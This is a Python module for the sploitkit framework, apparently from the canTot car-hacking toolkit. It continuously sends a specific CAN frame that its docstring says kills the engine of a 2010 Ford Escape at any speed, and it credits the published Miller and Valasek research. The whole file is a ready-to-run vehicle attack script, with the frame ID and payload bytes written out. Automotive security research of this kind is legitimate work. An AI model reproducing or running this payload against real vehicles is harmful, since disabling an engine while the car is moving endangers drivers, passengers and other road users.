from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class ford_escape_kill_engine(Module):
    """ This module will kill the engine for Ford Escape 2010 without establishing a diagnostic session and works at any speed.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: https://ioactive.com/pdfs/IOActive_Adventures_in_Automotive_Networks_and_Control_Units.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Trying to Kill the Engine")
        frame = can.Frame(0x7E0)
        frame.data = [0x05,0x31,0x01,0x40,0x44,0xFF,0x00,0x00]
        print("[+] By continuously sending this packet you will kill the engine and it won’t start up again until you stop sending the packet.")
        print("[++] Press Ctrl+C to stop or cancel")

        while True:
            dev.send(frame)
        pass
